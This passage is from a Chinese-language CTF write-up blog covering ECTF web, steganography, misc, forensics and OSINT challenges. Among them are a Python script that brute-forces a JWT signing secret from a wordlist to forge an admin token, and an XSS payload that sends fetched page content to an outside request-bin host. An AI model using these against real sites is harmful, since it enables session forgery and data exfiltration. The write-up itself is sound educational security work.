1HMACSHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload),密钥) 以确保当前信息的完整性（integrity），真实性（authenticity）。 在这道题我们会首先在目标网站里得到我们的JWT（我们每次访问网站都会得到一个新的JWT）： 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM 用 https://jwt.io/ 分析一下： 可以看到，Payload里有一个名为”username“的值当前被设置为“user”，我们猜测只需要将其改成“admin”并且用其再次访问网站即可获得flag。 根据题目的提示，我们先将这个JWT的密钥给爆破出来： 1234567891011121314151617181920212223242526272829import jwtimport timedef brute_force_jwt(token): # header, payload, signature = token.split(&#x27;.&#x27;) with open(&quot;rockyou.txt&quot;, &#x27;r&#x27;, encoding=&#x27;latin-1&#x27;) as f: for line in f: secret = line.strip() try: decoded = jwt.decode(token, secret, algorithms=[&#x27;HS256&#x27;]) print(f&quot;[+] Found secret key: &#123;secret&#125;&quot;) print(f&quot;Decoded JWT: &#123;decoded&#125;&quot;) return secret except jwt.ExpiredSignatureError: print(f&quot;[-] Expired token with key: &#123;secret&#125;&quot;) return secret except jwt.InvalidTokenError: pass print(&quot;[-] No valid secret found in wordlist.&quot;) return Nonejwt_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM&quot;brute_force_jwt(jwt_token)# [+] Found secret key: 1234 用这个网站将我们的JWT的payload改成“admin” 之后再用这个新的JWT访问网站即可得到flag： 1ectf&#123;JwT_T0keN_cR34t0r&#125; Chat with the admin 这道题比较明显地暗示了我们需要用xss攻击来获取flag。我们首先在 https://pipedream.com/ 创建一个Request Bin（创建临时的 HTTP 端点，用于捕获和检查传入的 HTTP 请求。）， 然后在对话框里输入以下内容即可： 1&lt;script&gt;fetch(&#x27;http://instances.ectf.fr:11111/&#x27;).then(response =&gt; response.text()).then(text =&gt; document.location=&quot;https://xxxxxxxxxxxx.m.pipedream.net?flag=&quot;+btoa(encodeURIComponent(text)))&lt;/script&gt; 之后便会在Request Bin的访问纪录里查看flag： 1ECTF&#123;Cook13_st0L3n_5ucc3ssfuLLy&#125; 3. Steganography（隐写）Definitely not in the PDF 将下载的压缩包解压会得到一份pdf文件： /Stega_-_Definitely_not_in_the_PDF/world_flags.jpg) 并没有任何发现，再根据他一直说的“flag”不在这里，于是决定去看一开始的压缩包。果然在文件结尾发现flag： 1ECTF&#123;W3lL_d0nE_652651663616263&#125; JB1804 我们会得到一份乐谱： 通过检查发现它并没有隐写任何内容在hex文件里，抑或是LSB隐写。 通过谷歌搜索“music Steganography 1804”可以发现这个维基词条： 点进去之后搜索“1804”会发现Johann Bücking在1804年发明了一种乐谱密码： 根据这张密码表解码会得到： 1ectf&#123;steganomousiqueissuperswag&#125; (法语中的“音乐“是”musique“，所以flag的内容为stegano mousique is super swag。) The island’s treasure 下载文件会得到2张图片： 首先用010 Editor打开第一张图片会发现 在Description后面有一段base64编码 1UnNPcGJHbGphWFJoZEdsdmJuTWdJU0JVZFNCaGN5QjBjbTkxZHNPcElHeGhJR05zdzZrZ2JzS3dNU0JrZFNCamIyWm1jbVVnSVEwS1EyOXVaM0poZEhWc1lYUnBiMjV6SUNFZ1dXOTFJR1p2ZFc1a0lIUm9aU0JyWlhrZ2JzS3dNU0J2WmlCMGFHVWdZMmhsYzNRZ0lRMEtRMnpEcVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTU5Da3RsZVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTT0= 解码后会得到 1RsOpbGljaXRhdGlvbnMgISBUdSBhcyB0cm91dsOpIGxhIGNsw6kgbsKwMSBkdSBjb2ZmcmUgIQ0KQ29uZ3JhdHVsYXRpb25zICEgWW91IGZvdW5kIHRoZSBrZXkgbsKwMSBvZiB0aGUgY2hlc3QgIQ0KQ2zDqTogTTN0NGQ0dDRfMTVfbjB0XzVhZjMNCktleTogTTN0NGQ0dDRfMTVfbjB0XzVhZjM= 再解码一次会得到key1： 1234Félicitations ! Tu as trouvé la clé n°1 du coffre !Congratulations ! You found the key n°1 of the chest !Clé: M3t4d4t4_15_n0t_5af3Key: M3t4d4t4_15_n0t_5af3 因为hex文件里面看起来找不到第二段key了，所以我们用Stegsolve.jar打开这张图片查看是否有用LSB隐写的内容。当调整到Red Plane 0时会得到 我们将这张照片导出会得到第二部分的key（key2）： 123key1: M3t4d4t4_15_n0t_5af3key2: Hidd3n_p1ctur3key = key1:key2 = M3t4d4t4_15_n0t_5af3:Hidd3n_p1ctur3 然后我们现在来打开箱子：根据提示，支持加密隐写并且有GUI的软件并不多，所以我们来试一下OpenStego： 提取出来的照片为： 成功找到flag： 1ECTF&#123;You_found_th3_tr3asur3&#125; Silhouette in cyberpunk 这道题我们会得到一张图片： 非常赛博风。 注意到这两个地方的点组的排列非常像我们日常生活中（比如说电梯里）会碰到的盲文： （近点的那栋大楼） （画面左边远处的那栋大楼） 第一张里面的盲文翻译过来是： 1This is just a dummyy, nice try 而第二张里面的内容才是真正的flag： 12345⠓⠼⠁⠙⠙⠼⠉⠝⠼⠁⠝⠹⠼⠉⠙⠼⠙⠗⠅⠝⠼⠉⠎⠎-&gt;h1dd3n1nth3d4rkn3ss (可以用这个网站翻译盲文内容：https://www.dcode.fr/alphabet-braille) 根据题目的flag格式要求，我们确定flag为： 1ectf&#123;h1dd3n_1n_th3_d4rkn3ss&#125; 4. MiscellaneousExtraction Mission Heart of the vault 这道题我们会得到一个加密的压缩包Misc_5_-_dwarf_vault_200.zip，将其爆破之后会再次得到一个加密的压缩包dwarf_vault_199.zip，再重复一次操作会得到dwarf_vault_198.zip，也是加密了的。所以我们猜测作者将一份文件（夹）重复加密压缩了200次。所以决定写一个脚本自动化完成这些操作，并且根据提示将所有密码保存进一个txt文件里： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import zipfileimport osimport shutilimport zlib# 定义初始zip文件路径和字典文件路径zip_path = &quot;Misc_5_-_dwarf_vault_200.zip&quot;dict_path = &quot;rockyou.txt&quot;passwords = [] # 记录所有找到的密码def brute_force_zip(zip_path, dict_path): try: with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_file: with open(dict_path, &quot;r&quot;, encoding=&quot;latin-1&quot;) as f: for line in f: password = line.strip().encode(&quot;latin-1&quot;) # 转换为字节格式 try: zip_file.extractall(pwd=password) print(f&quot;[+] 找到密码: &#123;password.decode()&#125;&quot;) passwords.append(password.decode()) # 获取解压后的文件夹或文件名 extracted_files = zip_file.namelist() return extracted_files # 返回解压出的文件名列表 except (RuntimeError, zipfile.BadZipFile, zlib.error): continue print(&quot;[-] 未找到密码，请尝试其他字典或方法。&quot;) return None except FileNotFoundError: print(&quot;[!] 文件未找到，请检查路径是否正确。&quot;) return None except zlib.error: print(&quot;[!] 遇到 zlib 解压错误，终止爆破。&quot;) return None# 递归解压直到没有更多 zip 文件def recursive_brute_force(zip_path, dict_path): try: while zip_path: extracted_files = brute_force_zip(zip_path, dict_path) if not extracted_files: break # 查找新的 ZIP 文件 new_zip_path = None for file in extracted_files: if file.endswith(&quot;.zip&quot;): new_zip_path = file break if new_zip_path: zip_path = new_zip_path # 直接使用新找到的 ZIP 文件 else: print(&quot;[!] 没有找到更多的 ZIP 文件，任务完成！&quot;) break except zlib.error: print(&quot;[!] 发生 zlib 错误，终止爆破。&quot;) finally: # 将所有找到的密码写入文件 with open(&quot;found_passwords.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f: for password in passwords: f.write(password + &quot;\\n&quot;)# 运行爆破函数recursive_brute_force(zip_path, dict_path)print(&quot;所有找到的密码:&quot;, passwords) 注意，爆破到dwarf_vault_1.zip经常会返回奇怪的ERROR，所以这里的代码逻辑最好是在遇到意外ERROR时直接终止爆破并将现有的所有密码先写进txt文件，不然容易卡在这里重复很多次。 再成功解压dwarf_vault_1.zip后，我们会得到2份文件：drop_pod.py以及mining_report.txt。 txt文件的内容为： 1Mining report - flag coordinates: ectf&#123;[[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]&#125; 用coordinate将flag表示了出来。于是来检查drop_pod.py的内容： 12345678910111213141516171819202122232425262728293031323334#Maybe the flag was the friends we made along the waypassword = &quot; &quot;flag = &quot;FAKE FLAG THIS IS NOT REAL&quot;def find_positions(flag, crew_list): positions = [] for char in flag: if char == &quot;_&quot;: positions.append(&quot;_&quot;) continue found = False for i, name in enumerate(crew_list): if char.lower() in name.lower(): positions.append([i, name.lower().index(char.lower())]) found = True break if not found: positions.append([None, None]) return positionspositions = find_positions(flag, password.split())output_text = &quot;Mining report - flag coordinates: ectf&#123;&quot; + str(positions) + &quot;&#125;&quot;with open(&quot;mining_report.txt&quot;, &quot;w&quot;) as file: file.write(output_text)print(&quot;Rock and Stone! Report written to mining_report.txt:&quot;, output_text) 是这段坐标的生成逻辑。所以可以编写一段代码，靠我们刚才保存的所有压缩密码来还原flag： 123456789101112131415161718192021222324252627with open(&quot;found_passwords.txt&quot;, &quot;r&quot;) as file: reversed_passwords = file.readlines()# 去除换行符并反转列表（因为我们爆破时是从200开始的，所以这里需要反过来）password_list = [line.strip() for line in reversed_passwords][::-1]#txt里的内容positions = [[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]# 还原 flagflag = &quot;&quot;for pos in positions: if pos == &quot;_&quot;: flag += &quot;_&quot; else: i, j = pos if 0 &lt;= i &lt; len(password_list) and 0 &lt;= j &lt; len(password_list[i]): flag += password_list[i][j] else: flag += &quot;?&quot; # 标记错误或缺失数据# 输出结果print(&quot;flag:&quot;, &quot;ectf&#123;&quot; + flag + &quot;&#125;&quot;)# flag: ectf&#123;d1ggy_d1ggy_h0l3&#125; 5. ForensicMy dearest 我们会得到一份docx文件，也就是word文件。打开后在信息的作者处即可找到文件作者： 根据题目要求，flag为： 1ectf&#123;MichelTeller&#125; Capture the hidden 这道题我们会得到一份.pcap文件，用Wireshark打开它。 由于是要找一份文件，我们先点击“文件” -&gt; “导出对象” -&gt; “HTTP”： 确实发现了一份上传的文件。可以点击保存它，但是打开会发现内容不不完整： 12345data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5-&gt;(base64)ectf&#123;P05t_1s_v3ry_345y_T0_F1N 于是我们找这份文件在纪录里的具体位置： 可以看到我们保存的upload的文件内容只有蓝色部分，当我们将后续的内容也提出来，便会得到完整的flag： 12345data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5EfQ==-&gt;(base64)ectf&#123;P05t_1s_v3ry_345y_T0_F1ND&#125; Just a PCAP 这道题也是一份pcap文件，再次用Wireshark打开。 但是用之前的操作：“文件” -&gt; “导出对象” -&gt; “HTTP”，并不会发现任何东西。（实际上是因为这段纪录里并没有任何HTTP传输的内容。） 这时我们仔细观察第一条纪录的info会发现它是以”89504E47“，这是非常典型的PNG文件的文件头（因为它对应ASCII字符“‰PNG”），所以我们猜测这些纪录的info内容可以拼成一份完整的PNG文件。我们用这段代码将所有纪录的info内容提取出来并且保存成.png：（这段代码能运行的前提条件是下载了Wireshark\\的tshark.exe 123456789101112131415import pysharkimport pyshark.packetfrom binascii import unhexlifycapture = pyshark.FileCapture(&#x27;justapcap.pcap&#x27;, tshark_path=&#x27;D:\\\\Program Files\\\\Wireshark\\\\tshark.exe&#x27;) # 将这个路径替换成自己电脑上tshark.exe的路径hexstr = &quot;&quot;cnt = 0for packet in capture: s = str(packet) cur = s.split(&quot;Name:&quot;)[-1].split(&quot;.&quot;)[0].split(&quot;1m &quot;)[1] hexstr += curhexstr = hexstr.split(&quot;exam&quot;)[0]with open(&quot;a.png&quot;,&quot;wb&quot;) as f: f.write(unhexlify(hexstr)) 然后就会得到这张图片： 1ectf&#123;DN5_3xf1ltr@t10n_15_flnd3d&#125; 6. OsintProject-153-Q1 这道题我们会得到这张图片： 通过谷歌识图可以很轻易地知道这个地方是：Falls Caramy, 法语原名为Chutes_du_Caramy。 得到flag： 1ectf&#123;Chutes_du_Caramy&#125; Project-153-Q2 这道题我们会得到这张图片： 通过谷歌识图可以判断出来这张照片是在 Massif de l’Esterel 附近拍摄的。 但由于题目要求的是拍摄时所处的具体位置，所以我们还需要找些其他的线索。 注意到图片远处这里，有一座全是房子的半岛： 于是我们打开Google Earth，查看Massif de l’Esterel附近的海岸线。可以发现这个地方非常想图中的半岛： 并且点开 Calanque de l’Esterel, 83700 Saint-Raphaël, 法国 的相册可以看到这样一张图片： 跟我们图片里的一模一样。沿着这个方向依次尝试带有名字的地点，便可以成功找到拍摄地：Pointe de l’Observatoire, D559, 83700 Saint-Raphaël, 法国。 1ectf&#123;Pointe_de_l&#x27;Observatoire&#125; Project-153-Q3 这道题我们会得到这张图片： 再次通过谷歌识图可以发现图片所在地是 Rocher de Roquebrune： 在Google Earth找到这里 便可以在相册里发现这张图片，大概率是题目所指的“monster： 所以答案为左下角的作者名字。 1ectf&#123;Michael_DELAETER&#125; Project-153-Q4 首先通过谷歌识图判断出照片所在地应该是：Bormes-les-Mimosas 在Google Earth找到这里： 根据照片拍摄角度以及题目描述不难猜出远处的那座岛应该是 Île du Levant。 1ectf&#123;Île_du_Levant&#125; Project-153-Q5 这道题我们会得到这张图片： /OSINT_1_-_question-5/PANO_20220408_134922.jpg) 这道题会碰到一个非常有意思的事情。我们拿到的图片的文件大小为29.8 MB，而谷歌识图的上限为20MB，所以我们首先需要压缩一下图片的大小才能使用谷歌识图。我这里是用微信来进行有损压缩的。 然后便可以用谷歌识图来确认地点： 1ectf&#123;Gros_Cerveau&#125; (在法语中，“le” 是阳性单数定冠词，所以不包含在答案内。) Project-153-Q6 这道题我们会得到这张图片： 再次通过谷歌识图我们可以找到这样一条Instergram： （为了防止侵犯个人隐私我给图片打了个码。） 于是可以得知这张照片的拍摄所在地为 Moustiers-Sainte-Marie （zipcode：04360）。 至于台阶数可以直接利用开了联网功能的ChatGPT所搜即可： 最后的flag为： 1ectf&#123;262_04360&#125; PNJ - 3 - Gouzou 这道题我们会得到一个文件夹，里面有非常多的文件，它说的这个“the”属实是有点意义不明，所以我们先去搜索看一下GOUZOU是什么： 发现是法国艺术家JACE创作一个没有五官的诙谐卡通形象。根据这条线索我们可以锁定这张图片（也就是说我们需要找的应该是这张图片的具体位置）： 根据谷歌识图可以发现这张照片在 “Île de Ré”（雷岛）： 通过搜索“île de ré gouzou”可以找到这个网页：https://www.realahune.fr/les-murs-dexpression-de-latlantique/，并且发现： 于是我们确定这幅画是在”la digue du Boutillon, île de Ré”(是一座防波堤)，得到flag： 1ectf&#123;digue_du_boutillon&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"},{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/categories/CTF/Misc/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"},{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/categories/CTF/Reverse-Engineering/"},{"name":"Dantenbank 数据库","slug":"TUM课程笔记/Dantenbank-数据库","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/tags/XSS/"},{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"逻辑电路图","slug":"逻辑电路图","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/"},{"name":"逻辑门","slug":"逻辑门","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E9%97%A8/"},{"name":"wsl","slug":"wsl","permalink":"https://archer-baiyi.github.io/tags/wsl/"},{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/tags/sage/"},{"name":"vscode","slug":"vscode","permalink":"https://archer-baiyi.github.io/tags/vscode/"},{"name":"Cookie","slug":"Cookie","permalink":"https://archer-baiyi.github.io/tags/Cookie/"},{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"哈希","slug":"哈希","permalink":"https://archer-baiyi.github.io/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/tags/Hash/"},{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/tags/Misc/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/tags/esolang/"},{"name":"Piet","slug":"Piet","permalink":"https://archer-baiyi.github.io/tags/Piet/"},{"name":"SQL Injection","slug":"SQL-Injection","permalink":"https://archer-baiyi.github.io/tags/SQL-Injection/"},{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"},{"name":"PHP 代码注入","slug":"PHP-代码注入","permalink":"https://archer-baiyi.github.io/tags/PHP-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"},{"name":"greedy","slug":"greedy","permalink":"https://archer-baiyi.github.io/tags/greedy/"},{"name":"sortings","slug":"sortings","permalink":"https://archer-baiyi.github.io/tags/sortings/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/tags/Template-Injection/"},{"name":"模板注入","slug":"模板注入","permalink":"https://archer-baiyi.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Jinja2","slug":"Jinja2","permalink":"https://archer-baiyi.github.io/tags/Jinja2/"},{"name":"Mako","slug":"Mako","permalink":"https://archer-baiyi.github.io/tags/Mako/"},{"name":"C++","slug":"C","permalink":"https://archer-baiyi.github.io/tags/C/"},{"name":"cpp","slug":"cpp","permalink":"https://archer-baiyi.github.io/tags/cpp/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"},{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"文件系统","slug":"文件系统","permalink":"https://archer-baiyi.github.io/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"输入/输出","slug":"输入-输出","permalink":"https://archer-baiyi.github.io/tags/%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/"},{"name":"汇编语言","slug":"汇编语言","permalink":"https://archer-baiyi.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"RISC-V","slug":"RISC-V","permalink":"https://archer-baiyi.github.io/tags/RISC-V/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/tags/Reverse-Engineering/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://archer-baiyi.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"container","slug":"container","permalink":"https://archer-baiyi.github.io/tags/container/"},{"name":"Datenbank","slug":"Datenbank","permalink":"https://archer-baiyi.github.io/tags/Datenbank/"},{"name":"Database","slug":"Database","permalink":"https://archer-baiyi.github.io/tags/Database/"},{"name":"数据库","slug":"数据库","permalink":"https://archer-baiyi.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"socket","slug":"socket","permalink":"https://archer-baiyi.github.io/tags/socket/"},{"name":"remote","slug":"remote","permalink":"https://archer-baiyi.github.io/tags/remote/"},{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]}